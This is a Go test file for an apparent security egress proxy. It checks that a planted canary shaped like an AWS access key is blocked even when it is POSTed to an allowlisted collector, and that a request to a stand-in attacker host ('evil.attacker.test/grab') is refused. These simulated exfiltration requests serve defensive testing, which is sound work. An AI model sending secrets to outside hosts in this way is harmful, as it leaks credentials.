// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package playground

import (
	"context"
	"net/http"
	"testing"
)

// TestLiveRun_CollectorBeat_AllowlistDoesNotBypassContentScanning is the
// independent-attestation centerpiece: it proves that being an APPROVED
// (allowlisted) destination does NOT exempt content from scanning. The lab
// collector host is on the proxy's trusted/allowlist set, yet a RAW planted
// canary POSTed to it must be content-blocked before egress -- the
// allowlist-doesn't-bypass-content-scanning invariant from CLAUDE.md.
//
// The single bundle asserts the whole beat:
//
//	(a) the raw-canary POST to the ALLOWLISTED collector is blocked (4xx) and a
//	    signed BLOCKED decision is emitted (Pipelock's own attestation);
//	(b) the collector -- the intended recipient -- independently witnesses
//	    nothing: observed == 0 AND total == 0 (the request never reached egress);
//	(c) a NON-allowlisted host is still blocked (no allowlist regression);
//	(d) the allowlisted SAFE host (a DLP-clean config read) still works (the
//	    allowlist is not over-blocking benign traffic).
//
// Two independent signed facts back the claim: the proxy says "blocked" and the
// destination says "received nothing". That is independent attestation, not a
// single self-attested log line.
func TestLiveRun_CollectorBeat_AllowlistDoesNotBypassContentScanning(t *testing.T) {
	if testing.Short() {
		t.Skip("boots a real lab proxy + lab targets")
	}

	const runNonce = "collector-beat-run"
	lr, err := StartLiveRun(context.Background(), LiveRunOpts{
		ScenarioID: LiveDemoScenarioID,
		RunNonce:   runNonce,
	})
	if err != nil {
		t.Fatalf("StartLiveRun: %v", err)
	}
	defer lr.Close()

	client := proxiedClient(t, lr)
	ctx := context.Background()

	collectorURL := lr.liveExfilURL()
	safeURL := lr.liveSafeURL()

	tests := []struct {
		name    string
		method  string
		rawURL  string
		body    []byte
		wantMin int // inclusive lower bound on acceptable status
		wantMax int // inclusive upper bound on acceptable status
	}{
		{
			// (a) The beat: destination ALLOWED, content BLOCKED. A raw planted
			// canary (AWS-access-key shape, critical DLP) in the body of a POST to
			// the allowlisted collector must hard-block even though the host is
			// trusted, because allowlist must not bypass content scanning.
			name:    "raw_canary_to_allowlisted_collector_blocked",
			method:  http.MethodPost,
			rawURL:  collectorURL,
			body:    []byte("file_contents=config\ncanary=" + lr.canaryValue + "\n"),
			wantMin: 400,
			wantMax: 599,
		},
		{
			// (c) No allowlist regression: an arbitrary host outside the trusted
			// set is refused (a jailbroken agent cannot reach arbitrary egress).
			name:    "non_allowlisted_host_blocked",
			method:  http.MethodGet,
			rawURL:  "http://evil.attacker.test/grab",
			wantMin: 400,
			wantMax: 599,
		},
		{
			// (d) No over-block: the DLP-clean lab config read on the allowlisted
			// safe host still succeeds.
			name:    "allowlisted_safe_host_allowed",
			method:  http.MethodGet,
			rawURL:  safeURL,
			wantMin: 200,
			wantMax: 299,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			st := doProxiedRequest(ctx, client, tc.method, tc.rawURL, tc.body, map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			})
			if st < tc.wantMin || st > tc.wantMax {
				t.Fatalf("%s %s status = %d, want in [%d,%d]", tc.method, tc.rawURL, st, tc.wantMin, tc.wantMax)
			}
		})
	}

	// (b) Independent witness: the collector -- the intended recipient -- received
	// nothing for this run. Read counts BEFORE Verdicts()/HasReceipt(), which close
	// the recorder. observed == 0 AND total == 0 proves the raw canary POST was
	// blocked before egress (it never physically reached the collector).
	if got := lr.collector.ObservedCount(runNonce); got != 0 {
		t.Fatalf("collector observed = %d, want 0 (the raw canary must never reach the destination)", got)
	}
	if got := lr.collector.TotalCount(runNonce); got != 0 {
		t.Fatalf("collector total = %d, want 0 (the blocked POST must not reach egress at all)", got)
	}

	// (a, cont.) Pipelock's own signed attestation: a BLOCKED decision was emitted
	// for the content-blocked POST. HasReceipt closes the recorder, so it must run
	// after the collector-count assertions above.
	if !lr.HasReceipt("block") {
		t.Fatalf("expected a signed BLOCKED decision for the raw-canary POST; verdicts = %v", lr.Verdicts())
	}
}
